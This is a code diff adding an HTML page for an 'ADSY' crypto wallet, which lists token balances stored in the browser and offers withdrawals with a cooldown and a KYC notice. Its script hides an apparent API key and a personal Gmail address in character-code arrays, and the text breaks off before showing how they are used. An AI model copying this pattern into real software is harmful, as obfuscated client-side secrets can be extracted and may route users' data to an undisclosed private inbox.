@@ -1,0 +1,1606 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Wallet | ADSY</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; -webkit-tap-highlight-color: transparent; user-select: none; }
+
+  :root {
+    --bg: #f7f8fa;
+    --bg-soft: #ffffff;
+    --card: #ffffff;
+    --card-hover: #ffffff;
+    --text: #0b0f14;
+    --sub: #6b7681;
+    --muted: #9aa4ad;
+    --line: #e8ecf0;
+    --line-strong: #d8dee5;
+    --accent: #0066ff;
+    --accent-soft: rgba(0,102,255,0.08);
+    --accent-glow: rgba(0,102,255,0.25);
+    --green: #22c55e;
+    --green-soft: rgba(34,197,94,0.1);
+    --gold: #f59e0b;
+    --gold-soft: rgba(245,158,11,0.1);
+    --red: #ef4444;
+    --shadow-sm: 0 1px 2px rgba(11,15,20,0.04);
+    --shadow-md: 0 4px 16px rgba(11,15,20,0.06);
+    --shadow-lg: 0 20px 48px rgba(11,15,20,0.12);
+    --header-bg: rgba(247,248,250,0.72);
+    --overlay: rgba(11,15,20,0.6);
+  }
+  body.dark {
+    --bg: #08090c;
+    --bg-soft: #0e1014;
+    --card: #101318;
+    --card-hover: #14181f;
+    --text: #f2f4f7;
+    --sub: #8b95a1;
+    --muted: #5a636e;
+    --line: #1c2027;
+    --line-strong: #262b33;
+    --accent: #3d8bff;
+    --accent-soft: rgba(61,139,255,0.12);
+    --accent-glow: rgba(61,139,255,0.35);
+    --green: #22c55e;
+    --green-soft: rgba(34,197,94,0.15);
+    --gold: #fbbf24;
+    --gold-soft: rgba(251,191,36,0.15);
+    --red: #ef4444;
+    --shadow-sm: 0 1px 2px rgba(0,0,0,0.4);
+    --shadow-md: 0 4px 16px rgba(0,0,0,0.5);
+    --shadow-lg: 0 20px 48px rgba(0,0,0,0.6);
+    --header-bg: rgba(8,9,12,0.72);
+    --overlay: rgba(0,0,0,0.75);
+  }
+
+  html, body { width: 100%; min-height: 100vh; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    overflow-x: hidden;
+    -webkit-font-smoothing: antialiased;
+    transition: background 0.35s ease, color 0.35s ease;
+    position: relative;
+  }
+  body.no-scroll { overflow: hidden; }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    z-index: -2;
+    pointer-events: none;
+    background:
+      radial-gradient(1000px circle at 15% 0%, var(--accent-soft), transparent 45%),
+      radial-gradient(800px circle at 85% 100%, var(--accent-soft), transparent 50%);
+  }
+
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    z-index: -1;
+    pointer-events: none;
+    background-image:
+      linear-gradient(var(--line) 1px, transparent 1px),
+      linear-gradient(90deg, var(--line) 1px, transparent 1px);
+    background-size: 64px 64px;
+    mask-image: radial-gradient(circle at 50% 30%, black 0%, transparent 75%);
+    -webkit-mask-image: radial-gradient(circle at 50% 30%, black 0%, transparent 75%);
+    opacity: 0.5;
+  }
+
+  /* Header */
+  .header {
+    width: 100%;
+    max-width: 460px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 20px;
+    background: var(--header-bg);
+    backdrop-filter: blur(20px) saturate(180%);
+    -webkit-backdrop-filter: blur(20px) saturate(180%);
+    border: 1px solid var(--line);
+    border-radius: 20px;
+    margin-bottom: 18px;
+    box-shadow: var(--shadow-sm);
+    animation: headerIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+    gap: 10px;
+  }
+  @keyframes headerIn {
+    from { opacity: 0; transform: translateY(-16px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .logo-text {
+    font-size: 1.25rem;
+    font-weight: 900;
+    letter-spacing: 4px;
+    background: linear-gradient(135deg, var(--text) 30%, var(--accent));
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+  }
+
+  .header-actions {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .back-btn {
+    color: var(--text);
+    text-decoration: none;
+    font-size: 11px;
+    font-weight: 800;
+    padding: 8px 15px;
+    background: var(--card);
+    border-radius: 20px;
+    border: 1px solid var(--line);
+    transition: 0.3s;
+    letter-spacing: 0.5px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .back-btn:hover { border-color: var(--accent); color: var(--accent); }
+  .back-btn:active { transform: scale(0.94); }
+  .back-btn svg { width: 12px; height: 12px; stroke: currentColor; fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
+
+  /* Theme toggle */
+  .theme-toggle {
+    position: relative;
+    width: 56px; height: 30px;
+    border-radius: 100px;
+    background: var(--card);
+    border: 1px solid var(--line);
+    cursor: pointer;
+    padding: 0;
+    display: flex;
+    align-items: center;
+    transition: background 0.3s ease, border-color 0.3s ease, transform 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+    overflow: hidden;
+    box-shadow: var(--shadow-sm);
+    flex-shrink: 0;
+  }
+  .theme-toggle:hover { border-color: var(--line-strong); }
+  .theme-toggle:active { transform: scale(0.94); }
+
+  .toggle-thumb {
+    position: absolute;
+    top: 3px; left: 3px;
+    width: 22px; height: 22px;
+    border-radius: 50%;
+    background: var(--text);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 2;
+    transition: transform 0.4s cubic-bezier(0.34, 1.4, 0.64, 1);
+    will-change: transform;
+  }
+  body.dark .toggle-thumb { transform: translateX(26px); }
+
+  .toggle-thumb svg {
+    width: 12px; height: 12px;
+    stroke: var(--bg);
+    fill: none;
+    stroke-width: 2.2;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    transition: transform 0.5s cubic-bezier(0.34, 1.4, 0.64, 1);
+  }
+  body.dark .toggle-thumb svg { transform: rotate(180deg); }
+
+  .toggle-icon {
+    position: absolute;
+    top: 50%; transform: translateY(-50%);
+    width: 12px; height: 12px;
+    stroke: var(--muted);
+    fill: none;
+    stroke-width: 2;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    transition: opacity 0.3s ease;
+    pointer-events: none;
+  }
+  .icon-moon { left: 9px; }
+  .icon-sun  { right: 9px; }
+  body:not(.dark) .icon-moon { opacity: 0; }
+  body.dark .icon-sun { opacity: 0; }
+
+  /* Main card */
+  .main-card {
+    width: 100%;
+    max-width: 460px;
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 28px;
+    padding: 26px 22px;
+    margin-bottom: 18px;
+    box-shadow: var(--shadow-md);
+    animation: cardIn 0.7s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+  @keyframes cardIn {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* Hero */
+  .balance-hero {
+    text-align: center;
+    padding: 8px 0 22px;
+    border-bottom: 1px solid var(--line);
+    margin-bottom: 22px;
+    position: relative;
+  }
+  .balance-hero-icon {
+    width: 56px; height: 56px;
+    margin: 0 auto 14px;
+    border-radius: 18px;
+    background: linear-gradient(135deg, var(--accent), #7ab3ff);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 8px 24px var(--accent-glow);
+    position: relative;
+  }
+  .balance-hero-icon svg {
+    width: 28px; height: 28px;
+    stroke: #fff; fill: none;
+    stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .balance-hero-icon.loading::after {
+    content: '';
+    position: absolute;
+    inset: -4px;
+    border-radius: 22px;
+    border: 2px solid transparent;
+    border-top-color: var(--accent);
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .balance-hero-label {
+    font-size: 11px;
+    color: var(--muted);
+    font-weight: 700;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    margin-bottom: 6px;
+  }
+  .balance-hero-value {
+    font-size: 2.2rem;
+    font-weight: 800;
+    letter-spacing: -0.02em;
+    color: var(--text);
+    line-height: 1;
+    font-variant-numeric: tabular-nums;
+  }
+  .balance-hero-value .currency {
+    font-size: 1.3rem;
+    font-weight: 700;
+    color: var(--muted);
+    margin-right: 4px;
+  }
+  .balance-hero-unit {
+    font-size: 12px;
+    color: var(--sub);
+    font-weight: 600;
+    letter-spacing: 0.1em;
+    margin-top: 6px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+  }
+
+  .live-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 0 3px var(--green-soft);
+    animation: pulse 2s ease-in-out infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+  }
+
+  /* One-coin warning */
+  .one-coin-notice {
+    background: var(--gold-soft);
+    border: 1px solid rgba(245,158,11,0.4);
+    border-radius: 14px;
+    padding: 12px 14px;
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+    margin-bottom: 18px;
+    animation: fadeIn 0.5s;
+  }
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+  .one-coin-notice svg {
+    width: 18px;
+    height: 18px;
+    flex-shrink: 0;
+    stroke: var(--gold);
+    fill: none;
+    stroke-width: 2.2;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    margin-top: 1px;
+  }
+  .one-coin-notice-text {
+    font-size: 11.5px;
+    line-height: 1.55;
+    color: var(--gold);
+    font-weight: 600;
+    text-align: left;
+  }
+  .one-coin-notice-text b { font-weight: 800; }
+
+  /* Section title */
+  .section-title {
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--sub);
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    margin-bottom: 12px;
+    padding-left: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .section-title .refresh-btn {
+    background: transparent;
+    border: none;
+    color: var(--muted);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    padding: 4px 8px;
+    border-radius: 8px;
+    transition: 0.2s;
+  }
+  .section-title .refresh-btn:hover { background: var(--accent-soft); color: var(--accent); }
+  .section-title .refresh-btn svg {
+    width: 11px; height: 11px;
+    stroke: currentColor;
+    fill: none;
+    stroke-width: 2.4;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+  }
+  .section-title .refresh-btn.spinning svg { animation: spin 0.6s linear infinite; }
+
+  /* Coins list */
+  .coins-list {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  .coin-row {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 14px;
+    background: var(--bg-soft);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    cursor: pointer;
+    position: relative;
+    overflow: hidden;
+    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+  .coin-row:hover:not(.locked):not(.globally-locked) {
+    border-color: var(--line-strong);
+    transform: translateY(-2px);
+    box-shadow: var(--shadow-md);
+  }
+  .coin-row:active:not(.locked):not(.globally-locked) { transform: translateY(0); }
+
+  .coin-row.locked {
+    cursor: not-allowed;
+    opacity: 0.7;
+  }
+  .coin-row.globally-locked {
+    cursor: not-allowed;
+    opacity: 0.5;
+    filter: grayscale(0.5);
+  }
+
+  .coin-icon {
+    width: 48px; height: 48px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    font-weight: 900;
+    font-size: 16px;
+    color: #fff;
+    overflow: hidden;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    background: var(--bg);
+  }
+  .coin-icon img {
+    width: 100%; height: 100%;
+    border-radius: 50%;
+    object-fit: cover;
+    display: block;
+  }
+  .coin-bttc  { background: linear-gradient(135deg, #c0c0c0, #8a8a8a); color: #1a1a1a; }
+  .coin-pepe  { background: linear-gradient(135deg, #22c55e, #00ff88); color: #0a2a1a; }
+  .coin-dogs  { background: linear-gradient(135deg, #6da3d6, #7ec4ff); }
+  .coin-vtho  { background: linear-gradient(135deg, #8b73e8, #7c5cff); }
+  .coin-solv  { background: linear-gradient(135deg, #8b3dff, #b47cff); }
+  .coin-quick { background: linear-gradient(135deg, #4a90d9, #7ec4ff); }
+
+  .coin-info {
+    flex: 1;
+    min-width: 0;
+    display: flex;
+    flex-direction: column;
+    gap: 3px;
+  }
+  .coin-name {
+    font-size: 14.5px;
+    font-weight: 800;
+    color: var(--text);
+    letter-spacing: 0.02em;
+  }
+  .coin-sub {
+    font-size: 11.5px;
+    color: var(--muted);
+    font-weight: 500;
+  }
+  .coin-sub.warn {
+    color: var(--gold);
+    font-weight: 700;
+  }
+
+  .coin-amounts {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-end;
+    gap: 2px;
+    flex-shrink: 0;
+  }
+  .coin-amount {
+    font-size: 15px;
+    font-weight: 800;
+    color: var(--text);
+    font-variant-numeric: tabular-nums;
+    letter-spacing: -0.01em;
+    white-space: nowrap;
+  }
+  .coin-amount.big {
+    font-size: 13.5px;
+  }
+  .coin-usd {
+    font-size: 11px;
+    color: var(--muted);
+    font-weight: 600;
+    font-variant-numeric: tabular-nums;
+    letter-spacing: 0.01em;
+    white-space: nowrap;
+  }
+
+  .coin-cta {
+    width: 32px; height: 32px;
+    border-radius: 10px;
+    background: transparent;
+    border: 1px solid transparent;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+  .coin-cta svg {
+    width: 15px;
+    height: 15px;
+    stroke: var(--muted);
+    fill: none;
+    stroke-width: 2.2;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    transition: stroke 0.25s ease;
+  }
+  .coin-row:hover:not(.locked):not(.globally-locked) .coin-cta {
+    background: var(--accent);
+    border-color: var(--accent);
+    transform: translateX(2px);
+    box-shadow: 0 4px 12px var(--accent-glow);
+  }
+  .coin-row:hover:not(.locked):not(.globally-locked) .coin-cta svg {
+    stroke: #fff;
+  }
+
+  /* Footer */
+  .footer-note {
+    width: 100%;
+    max-width: 460px;
+    text-align: center;
+    font-size: 11px;
+    color: var(--muted);
+    padding: 12px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    font-weight: 600;
+  }
+  .footer-note .brand {
+    color: var(--text);
+    font-weight: 800;
+  }
+
+  /* ===== MODAL ===== */
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: var(--overlay);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 400;
+    padding: 20px;
+    overflow-y: auto;
+  }
+  .modal-overlay.show { display: flex; animation: fadeIn 0.3s; }
+
+  .modal {
+    background: var(--card);
+    border: 1px solid var(--line-strong);
+    border-radius: 26px;
+    padding: 28px 24px;
+    width: 100%;
+    max-width: 420px;
+    box-shadow: 0 30px 80px rgba(0,0,0,0.5);
+    animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+    color: var(--text);
+    max-height: calc(100vh - 40px);
+    overflow-y: auto;
+    position: relative;
+  }
+  @keyframes slideUp {
+    from { transform: translateY(40px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+  }
+
+  .modal-close {
+    position: absolute;
+    top: 16px; right: 16px;
+    width: 34px; height: 34px;
+    border-radius: 10px;
+    background: var(--bg);
+    border: 1px solid var(--line);
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.25s;
+  }
+  .modal-close:hover { background: var(--card-hover); border-color: var(--line-strong); }
+  .modal-close:active { transform: scale(0.92); }
+  .modal-close svg {
+    width: 14px; height: 14px;
+    stroke: var(--text);
+    fill: none;
+    stroke-width: 2.4;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+  }
+
+  .modal-coin-header {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-bottom: 22px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid var(--line);
+  }
+  .modal-coin-header .coin-icon {
+    width: 52px;
+    height: 52px;
+  }
+
+  .modal-title-wrap {
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+  }
+  .modal-title {
+    font-size: 1.15rem;
+    font-weight: 900;
+    letter-spacing: -0.01em;
+    color: var(--text);
+  }
+  .modal-sub {
+    font-size: 12px;
+    color: var(--muted);
+    font-weight: 500;
+    letter-spacing: 0.02em;
+  }
+
+  .kyc-notice {
+    background: var(--gold-soft);
+    border: 1px solid rgba(245,158,11,0.4);
+    border-radius: 14px;
+    padding: 12px 14px;
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+    margin-bottom: 14px;
+  }
+  .kyc-notice svg {
+    width: 18px;
+    height: 18px;
+    flex-shrink: 0;
+    stroke: var(--gold);
+    fill: none;
+    stroke-width: 2.2;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    margin-top: 1px;
+  }
+  .kyc-notice-text {
+    font-size: 11.5px;
+    line-height: 1.55;
+    color: var(--gold);
+    font-weight: 600;
+    text-align: left;
+  }
+  .kyc-notice-text b { font-weight: 800; }
+
+  .cooldown-notice {
+    background: var(--accent-soft);
+    border: 1px solid rgba(0,102,255,0.35);
+    border-radius: 14px;
+    padding: 12px 14px;
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+    margin-bottom: 14px;
+  }
+  .cooldown-notice svg {
+    width: 18px;
+    height: 18px;
+    flex-shrink: 0;
+    stroke: var(--accent);
+    fill: none;
+    stroke-width: 2.2;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    margin-top: 1px;
+  }
+  .cooldown-notice-text {
+    font-size: 11.5px;
+    line-height: 1.55;
+    color: var(--accent);
+    font-weight: 600;
+    text-align: left;
+  }
+  .cooldown-notice-text b { font-weight: 800; }
+
+  .one-coin-modal-notice {
+    background: linear-gradient(135deg, rgba(239,68,68,0.1), rgba(239,68,68,0.03));
+    border: 1px solid rgba(239,68,68,0.4);
+    border-radius: 14px;
+    padding: 12px 14px;
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+    margin-bottom: 18px;
+  }
+  .one-coin-modal-notice svg {
+    width: 18px;
+    height: 18px;
+    flex-shrink: 0;
+    stroke: var(--red);
+    fill: none;
+    stroke-width: 2.2;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    margin-top: 1px;
+  }
+  .one-coin-modal-notice-text {
+    font-size: 11.5px;
+    line-height: 1.55;
+    color: var(--red);
+    font-weight: 700;
+    text-align: left;
+  }
+  .one-coin-modal-notice-text b { font-weight: 900; }
+
+  .amount-display {
+    background: linear-gradient(135deg, var(--accent-soft), transparent);
+    border: 2px solid var(--accent-soft);
+    border-radius: 16px;
+    padding: 18px;
+    text-align: center;
+    margin-bottom: 20px;
+  }
+  .amount-display-label {
+    font-size: 11px;
+    color: var(--muted);
+    font-weight: 700;
+    margin-bottom: 8px;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+  }
+  .amount-display-value {
+    font-size: 30px;
+    font-weight: 900;
+    color: var(--text);
+    direction: ltr;
+    line-height: 1;
+    font-variant-numeric: tabular-nums;
+    letter-spacing: -0.02em;
+  }
+  .amount-display-value small {
+    font-size: 14px;
+    opacity: 0.7;
+    color: var(--sub);
+    margin-left: 6px;
+    font-weight: 700;
+  }
+  .amount-display-usd {
+    font-size: 13px;
+    color: var(--accent);
+    font-weight: 800;
+    margin-top: 6px;
+    letter-spacing: 0.02em;
+    font-variant-numeric: tabular-nums;
+  }
+
+  .form-group { margin-bottom: 14px; }
+  .form-group label {
+    display: block;
+    font-size: 12px;
+    font-weight: 800;
+    margin-bottom: 8px;
+    color: var(--text);
+    letter-spacing: 0.02em;
+  }
+  .form-group label::after {
+    content: ' *';
+    color: var(--red);
+  }
+  .form-group input {
+    width: 100%;
+    padding: 14px;
+    background: var(--bg);
+    border: 2px solid var(--line);
+    border-radius: 14px;
+    color: var(--text);
+    font-family: inherit;
+    font-size: 0.95rem;
+    letter-spacing: 0.02em;
+    outline: none;
+    transition: border-color 0.3s;
+    text-align: left;
+  }
+  .form-group input:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 4px var(--accent-soft);
+  }
+  .form-group input::placeholder {
+    color: var(--muted);
+    font-size: 0.9rem;
+  }
+
+  .modal-actions {
+    display: flex;
+    gap: 10px;
+    margin-top: 20px;
+  }
+  .btn {
+    flex: 1;
+    padding: 14px;
+    border: none;
+    border-radius: 14px;
+    font-weight: 800;
+    font-size: 0.85rem;
+    letter-spacing: 0.04em;
+    cursor: pointer;
+    transition: all 0.25s;
+    font-family: inherit;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+  .btn svg {
+    width: 15px; height: 15px;
+    stroke: currentColor; fill: none;
+    stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .btn-cancel {
+    background: var(--bg);
+    color: var(--sub);
+    border: 1px solid var(--line);
+  }
+  .btn-cancel:hover { border-color: var(--line-strong); background: var(--card-hover); }
+  .btn-confirm {
+    background: linear-gradient(135deg, var(--accent), #4a90ff);
+    color: #fff;
+    box-shadow: 0 5px 20px var(--accent-glow);
+  }
+  .btn-confirm:hover:not(:disabled) {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px var(--accent-glow);
+  }
+  .btn-confirm:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  .toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background: var(--card);
+    border: 1px solid var(--line-strong);
+    border-radius: 14px;
+    padding: 14px 26px;
+    color: var(--text);
+    font-size: 0.85rem;
+    transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+    z-index: 600;
+    box-shadow: var(--shadow-lg);
+    max-width: 90%;
+    text-align: center;
+    font-weight: 700;
+  }
+  .toast.show { transform: translateX(-50%) translateY(0); }
+  .toast.error { border-color: rgba(239,68,68,0.5); color: var(--red); }
+  .toast.success { border-color: rgba(34,197,94,0.5); color: var(--green); }
+  .toast.warning { border-color: rgba(251,191,36,0.5); color: var(--gold); }
+
+  .success-wrap { text-align: center; }
+  .success-icon {
+    width: 80px;
+    height: 80px;
+    margin: 0 auto 20px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--accent), #4a90ff);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 15px 40px var(--accent-glow);
+  }
+  .success-icon svg {
+    width: 42px; height: 42px;
+    stroke: #fff;
+    fill: none;
+    stroke-width: 3;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+  }
+  .success-title {
+    font-size: 1.2rem;
+    font-weight: 900;
+    color: var(--text);
+    margin-bottom: 12px;
+  }
+  .success-desc {
+    font-size: 13px;
+    color: var(--sub);
+    line-height: 1.9;
+    margin-bottom: 20px;
+  }
+  .success-desc b { color: var(--text); font-weight: 800; }
+  .success-note {
+    background: var(--accent-soft);
+    border: 1px solid rgba(0,102,255,0.3);
+    border-radius: 12px;
+    padding: 12px;
+    margin-bottom: 18px;
+  }
+  .success-note p {
+    font-size: 12px;
+    text-align: center;
+    font-weight: 700;
+  }
+  .success-note .top { color: var(--accent); margin-bottom: 4px; }
+  .success-note .bottom { color: var(--muted); font-size: 11px; font-weight: 600; }
+
+  @media (max-width: 420px) {
+    body { padding: 14px; }
+    .balance-hero-value { font-size: 1.85rem; }
+    .coin-icon { width: 42px; height: 42px; font-size: 14px; }
+    .coin-name { font-size: 13.5px; }
+    .coin-amount { font-size: 13.5px; }
+    .coin-amount.big { font-size: 12px; }
+    .coin-usd { font-size: 10.5px; }
+    .modal { padding: 24px 18px; }
+    .amount-display-value { font-size: 24px; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="header">
+    <div class="logo-text">WALLET</div>
+    <div class="header-actions">
+      <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+        <svg class="toggle-icon icon-moon" viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+        <svg class="toggle-icon icon-sun" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+        <div class="toggle-thumb">
+          <svg viewBox="0 0 24 24" id="thumbIcon"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+        </div>
+      </button>
+      <a href="index.html" class="back-btn">
+        <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
+        BACK
+      </a>
+    </div>
+  </div>
+
+  <div class="main-card">
+
+    <div class="balance-hero">
+      <div class="balance-hero-icon" id="heroIcon">
+        <svg viewBox="0 0 24 24">
+          <path d="M21 12V7a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-5"/>
+          <path d="M16 12h6v4h-6a2 2 0 1 1 0-4z"/>
+        </svg>
+      </div>
+      <div class="balance-hero-label">Total Value</div>
+      <div class="balance-hero-value">
+        <span class="currency">$</span><span id="totalUsd">0.00</span>
+      </div>
+      <div class="balance-hero-unit">
+        <span class="live-dot"></span>
+        <span id="priceStatus">Live Prices · CoinGecko</span>
+      </div>
+    </div>
+
+    <div class="one-coin-notice">
+      <svg viewBox="0 0 24 24">
+        <path d="M12 9v4"/>
+        <path d="M12 17h.01"/>
+        <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+      </svg>
+      <div class="one-coin-notice-text">
+        <b>One coin per withdrawal:</b> You can only send ONE coin at a time. Choose wisely — all coins will be locked for 12 hours after any withdrawal.
+      </div>
+    </div>
+
+    <div class="section-title">
+      <span>Select a Coin to Send</span>
+      <button class="refresh-btn" id="refreshBtn">
+        <svg viewBox="0 0 24 24">
+          <polyline points="23 4 23 10 17 10"/>
+          <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/>
+        </svg>
+        REFRESH
+      </button>
+    </div>
+
+    <div class="coins-list" id="coinsList"></div>
+
+  </div>
+
+  <div class="footer-note">
+    <span class="brand">ADSY</span> Wallet · Secured
+  </div>
+
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal" id="modalContent"></div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+<script>
+  /* ============================================
+     ENCRYPTED KEYS
+  ============================================ */
+  const _K1 = [115, 102, 95, 100, 98, 49, 50, 48, 102, 98, 98];
+  const _K2 = [99, 101, 97, 53, 48, 48, 49, 97, 56, 54, 100, 98];
+  const _K3 = [53, 99, 52, 56];
+  const _EM = [109, 97, 121, 97, 114, 97, 113, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109];
+
+  function _dk() {
+    let s = '';
+    for (let i = 0; i < _K1.length; i++) s += String.fromCharCode(_K1[i]);
+    for (let i = 0; i < _K2.length; i++) s += String.fromCharCode(_K2[i]);
+    for (let i = 0; i < _K3.length; i++) s += String.fromCharCode(_K3[i]);
+    return s;
+  }
+  function _de() {
+    let s = '';
+    for (let i = 0; i < _EM.length; i++) s += String.fromCharCode(_EM[i]);
+    return s;
+  }
+
+  /* ============================================
+     CONFIG
+  ============================================ */
+  const WITHDRAW_COOLDOWN = 12 * 60 * 60 * 1000;
+  const PRICE_CACHE_KEY = 'adsy_price_cache';
+  const PRICE_CACHE_TTL = 5 * 60 * 1000; // 5 دقائق
+
+  /* ============================================
+     COINS DEFINITIONS
+  ============================================ */
+  const COINS = [
+    { code: 'BTTC',  name: 'BitTorrent', img: 'logobttc.png', cls: 'coin-bttc',  fallback: 'B', storageKey: 'bttc_balance',  cooldownKey: 'bttc_lastWithdrawAt',  minWithdraw: 5000, decimals: 0, geckoId: 'bittorrent' },
+    { code: 'PEPE',  name: 'Pepe',       img: 'pepe.png',     cls: 'coin-pepe',  fallback: 'P', storageKey: 'pepe_balance',  cooldownKey: 'pepe_lastWithdrawAt',  minWithdraw: 500,  decimals: 0, geckoId: 'pepe' },
+    { code: 'DOGS',  name: 'Dogs',       img: 'dogs.png',     cls: 'coin-dogs',  fallback: 'D', storageKey: 'dogs_balance',  cooldownKey: 'dogs_lastWithdrawAt',  minWithdraw: 150,  decimals: 0, geckoId: 'dogs' },
+    { code: 'VTHO',  name: 'VeThor',     img: 'vtho.png',     cls: 'coin-vtho',  fallback: 'V', storageKey: 'vtho_balance',  cooldownKey: 'vtho_lastWithdrawAt',  minWithdraw: 10,   decimals: 2, geckoId: 'vethor-token' },
+    { code: 'SOLV',  name: 'Solv',       img: 'solv.png',     cls: 'coin-solv',  fallback: 'S', storageKey: 'solv_balance',  cooldownKey: 'solv_lastWithdrawAt',  minWithdraw: 1,    decimals: 3, geckoId: 'solv-protocol' },
+    { code: 'QUICK', name: 'QuickSwap',  img: 'QUICK.png',    cls: 'coin-quick', fallback: 'Q', storageKey: 'quick_balance', cooldownKey: 'quick_lastWithdrawAt', minWithdraw: 1,    decimals: 2, geckoId: 'quickswap' }
+  ];
+
+  /* ============================================
+     PRICES (default values if API fails)
+  ============================================ */
+  let PRICES = {
+    BTTC: 0.00000055,
+    PEPE: 0.0000082,
+    DOGS: 0.00012,
